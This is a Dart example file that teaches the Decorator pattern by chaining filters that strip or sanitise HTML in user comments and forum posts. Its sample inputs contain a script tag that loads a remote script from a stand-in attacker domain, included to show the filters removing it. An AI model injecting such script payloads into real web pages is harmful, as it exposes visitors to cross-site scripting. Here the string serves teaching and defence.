import 'package:design_patterns__decorator/dangerous_html_filter.dart';
import 'package:design_patterns__decorator/input_format.dart';
import 'package:design_patterns__decorator/input_format_impl.dart';
import 'package:design_patterns__decorator/markdown_format.dart';
import 'package:design_patterns__decorator/plain_text_filter.dart';

void execute() {
  print('Abordando:https://refactoring.guru/pt-br/design-patterns/decorator');
  String dangerousComment = '''Hello! Nice blog post!
Please visit my <a href='http://www.iwillhackyou.com'>homepage</a>.
<script src="http://www.iwillhackyou.com/script.js">
  performXSSAttack();
</script>''';

  var naiveInput = InputFormatImpl();
  print("+++> Website renders comments without filtering (unsafe):");
  displayCommentAsAWebsite(naiveInput, dangerousComment);
  print('--->');

  print('+++> Website renders comments after stripping all tags (safe):');
  var filteredInput = PlainTextFilter(inputFormat: naiveInput);
  displayCommentAsAWebsite(filteredInput, dangerousComment);
  print('--->');

  print('===> Post');
  var dangerousForumPost = '''
# Welcome

This is my first post on this **gorgeous** forum.

<script src="http://www.iwillhackyou.com/script.js">
  performXSSAttack();
</script>
''';
  naiveInput = InputFormatImpl();
  print(
      "+++> Website renders a forum post without filtering and formatting (unsafe, ugly):");
  displayCommentAsAWebsite(naiveInput, dangerousForumPost);
  print('----');

  var text = InputFormatImpl();
  var markdown = MarkdownFormat(inputFormat: text);
  var filteredInput2 = DangerousHtmlFilter(inputFormat: markdown);
  print(
      "+++> Website renders a forum post after translating markdown markup. and filtering some dangerous HTML tags and attributes (safe, pretty):");
  displayCommentAsAWebsite(filteredInput2, dangerousForumPost);
}

displayCommentAsAWebsite(InputFormat inputFormat, String text) {
  print(inputFormat.formatText(text));
}
